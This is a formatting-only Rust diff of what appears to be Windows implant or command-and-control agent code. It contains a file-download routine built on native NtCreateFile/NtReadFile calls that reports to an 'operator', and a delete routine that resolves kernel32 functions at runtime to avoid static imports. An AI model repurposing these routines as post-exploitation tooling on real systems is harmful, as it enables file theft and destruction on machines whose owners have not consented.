@@ -386,7 +386,9 @@ pub fn do_download(rt: &Runtime, path: &str) -> Vec<Response> {
         return vec![Response::Err(String::from("download: empty path"))];
     }
     if !allowed(path) {
-        return vec![Response::Err(String::from("download: refusing protected target"))];
+        return vec![Response::Err(String::from(
+            "download: refusing protected target",
+        ))];
     }
     unsafe {
         let handle = match open_file(
@@ -397,9 +399,13 @@ pub fn do_download(rt: &Runtime, path: &str) -> Vec<Response> {
             FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
         ) {
             Ok(h) => h,
-            Err(OpenError::BadPath) => return vec![Response::Err(String::from("download: invalid path"))],
+            Err(OpenError::BadPath) => {
+                return vec![Response::Err(String::from("download: invalid path"))]
+            }
             Err(OpenError::Unresolved) => {
-                return vec![Response::Err(String::from("download: NtCreateFile unresolved"))]
+                return vec![Response::Err(String::from(
+                    "download: NtCreateFile unresolved",
+                ))]
             }
             Err(OpenError::Status(s)) => {
                 let msg = if s == STATUS_OBJECT_NAME_NOT_FOUND {
@@ -440,9 +446,9 @@ pub fn do_download(rt: &Runtime, path: &str) -> Vec<Response> {
                 }
             };
             let got = read_iosb.information; // bytes actually read
-            // EOF reached. STATUS_END_OF_FILE is success-ish for NtReadFile at
-            // the end of a file (NOT an error), and a 0-length read likewise
-            // means the stream is drained.
+                                             // EOF reached. STATUS_END_OF_FILE is success-ish for NtReadFile at
+                                             // the end of a file (NOT an error), and a 0-length read likewise
+                                             // means the stream is drained.
             if status == STATUS_END_OF_FILE || got == 0 {
                 // EOF. If we never produced a chunk (empty file), emit one empty
                 // EOF chunk so the operator sees completion.
@@ -604,18 +610,16 @@ fn fileop_rm(rt: &Runtime, path: &str) -> Response {
     type GetFileAttributesW = unsafe extern "system" fn(*const u16) -> u32;
     type DeleteFileW = unsafe extern "system" fn(*const u16) -> i32;
     type RemoveDirectoryW = unsafe extern "system" fn(*const u16) -> i32;
-    let del: DeleteFileW = match unsafe {
-        crate::resolve::export_addr(b"kernel32.dll", b"DeleteFileW")
-    } {
-        Some(a) => unsafe { core::mem::transmute(a) },
-        None => return Response::Err(String::from("rm: DeleteFileW unresolved")),
-    };
-    let rmdir: RemoveDirectoryW = match unsafe {
-        crate::resolve::export_addr(b"kernel32.dll", b"RemoveDirectoryW")
-    } {
-        Some(a) => unsafe { core::mem::transmute(a) },
-        None => return Response::Err(String::from("rm: RemoveDirectoryW unresolved")),
-    };
+    let del: DeleteFileW =
+        match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"DeleteFileW") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return Response::Err(String::from("rm: DeleteFileW unresolved")),
+        };
+    let rmdir: RemoveDirectoryW =
+        match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"RemoveDirectoryW") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return Response::Err(String::from("rm: RemoveDirectoryW unresolved")),
+        };
     let _ = unsafe {
         // Touch the type to keep it resolved-but-unused (GetFileAttributesW is
         // an alternative detection; we used probe_is_dir instead, but resolve
@@ -635,7 +639,9 @@ fn fileop_rm(rt: &Runtime, path: &str) -> Response {
     if ok != 0 {
         Response::Ok
     } else {
-        Response::Err(String::from("rm: delete failed (not found / in use / access denied)"))
+        Response::Err(String::from(
+            "rm: delete failed (not found / in use / access denied)",
+        ))
     }
 }
 
